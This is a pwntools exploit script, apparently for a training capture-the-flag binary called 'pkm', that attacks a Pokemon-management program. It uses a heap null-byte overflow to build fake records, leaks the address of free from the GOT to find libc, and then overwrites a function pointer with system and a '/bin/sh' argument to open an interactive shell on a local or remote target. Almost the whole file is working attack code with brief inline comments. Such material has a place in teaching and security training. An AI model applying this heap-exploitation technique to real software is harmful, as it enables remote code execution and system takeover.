from pwn import *
import time


CHALL_PATH = "./pkm_pathced"
CHALL = ELF(CHALL_PATH)
LIBC = ELF("./libc-2.23.so")
COMMANDS = """
b *0x400F29
c
"""

context.arch = "amd64"

if args.REMOTE:
    c = remote("pkm.training.offensivedefensive.it",8080,ssl=True)
else:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, COMMANDS)
    else:
        c = process(CHALL_PATH)


def add_pkm(c):
    c.recvuntil(b"> ")
    c.sendline(b"0")

def rename_pkm(c, index, l, name):
    c.recvuntil(b"> ")
    c.sendline(b"1")
    c.recvuntil(b"> ")
    c.sendline(str(index).encode())
    c.recvuntil(b"insert length: ")
    c.sendline(str(l).encode())
    time.sleep(0.1)
    c.sendline(name)

def rename(c, index, new_name):
    rename_pkm(c, index, len(new_name), new_name)

def delete_pkm(c, index):
    c.recvuntil(b"> ")
    c.sendline(b"2")
    c.recvuntil(b"> ")
    c.sendline(str(index).encode())

def fight_pkm(c, first, move, second):
    c.recvuntil(b"> ")
    c.sendline(b"3")
    c.recvuntil(b"> ")
    c.sendline(str(first).encode())
    c.recvuntil(b"> ")
    c.sendline(str(move).encode())
    c.recvuntil(b"> ")
    c.sendline(str(second).encode())


def show_pkm(c, index):
    c.recvuntil(b"> ")
    c.sendline(b"4")
    c.recvuntil(b"> ")
    c.sendline(str(index).encode())

def exit_game(c):
    c.recvuntil(b"> ")
    c.sendline(b"5")

def fake_pkm():
    payload = b""
    payload += p64(0)
    payload += p64(0) # def
    payload += p64(0) # hp
    payload += p64(0) # max_hp
    payload += p64(0) # status
    payload += p64(0x401286)   # PKM default name
    payload += p64(0) + p64(0xdeadbeef) + p64(0xdeadbeef) + p64(0xdeadbeef) + p64(0xdeadbeef) # IVs
    payload += p64(0x602018) # got free, when info, it will printed the libc.free address
    payload += p64(0x400826) # TACKLE fun, useless, just to pass the check
    return payload
    

def fake_pkm_stage_2():
    payload = b""
    payload += p64(0x0068732f6e69622f) #  b"/bin/sh\0"[::-1].hex()
    payload += p64(0) # def
    payload += p64(0) # hp
    payload += p64(0) # max_hp
    payload += p64(0) # status
    payload += p64(0x401286)    # PKM default name
    payload += p64(0) + p64(0xdeadbeef) + p64(0xdeadbeef) + p64(0xdeadbeef) + p64(0xdeadbeef) # IVs
    payload += p64(0x401286) # useless, just to pass the check
    payload += p64(LIBC.symbols["system"]) # TACKLE fun, will be called when fight
    return payload


# a single pokemon is 0x101 bytes long
add_pkm(c)  # 0  
add_pkm(c)  # 1 
add_pkm(c)  # 2 


# creating the initial condition for Null byte overflow
rename(c, 0, b"A"*0x108)
rename(c, 1, b"B"*0x208) # enough to store 2 pokemons
rename(c, 2, b"C"*0x100)

delete_pkm(c, 1)  # free B

add_pkm(c)  # became index 1

rename(c, 0, b"A"*0x108)  # NULL byte overflow to change the size of freed B 

add_pkm(c)  # B1 index 3
add_pkm(c)  # B2 index 4

delete_pkm(c, 3)  # free B1
delete_pkm(c, 2)  # free C, trigger merge with B1


# -----------leak libc----------------

rename(c, 1, b"D"*0x100 + fake_pkm())  # overwrite chunk index 4 with fake pkm, to prepare for leak

show_pkm(c, 4)  # leak 
c.recvuntil(b"(0) ")
free_leak = c.recvuntil(b"\n").strip()
free_leak = u64(free_leak.ljust(8, b"\x00"))
print(f"Leak: {hex(free_leak)}")
LIBC.address = free_leak - LIBC.symbols["free"]
print(f"Libc base: {hex(LIBC.address)}")

# -----------stage 2.1----------------
# -----------repeat the null byte attack -----------

add_pkm(c)  # 2  
add_pkm(c)  # 3 
add_pkm(c)  # 5 


# creating the initial condition for Null byte overflow
rename(c, 2, b"E"*0x108)
rename(c, 3, b"F"*0x208) # enough to store 2 pokemons
rename(c, 5, b"G"*0x100)

delete_pkm(c, 3)  # free B

add_pkm(c)  # became index 3

rename(c, 2, b"E"*0x108)  # NULL byte overflow to change the size of freed B 

add_pkm(c)  # F1 index 6
add_pkm(c)  # F2 index 7

delete_pkm(c, 6)  # free B1
delete_pkm(c, 5)  # free G, trigger merge with F1

# -----------stage 2.2----------------
# ---------- inject system("/bin/sh") -----------

rename(c, 3, b"H"*0x100 + fake_pkm_stage_2())  # overwrite chunk index 7 with fake pkm, to prepare for leak

#-----------trigger system("/bin/sh")----------------

#input("Press enter to trigger system(\"/bin/sh\")")

fight_pkm(c, 7, 0, 0)

c.interactive()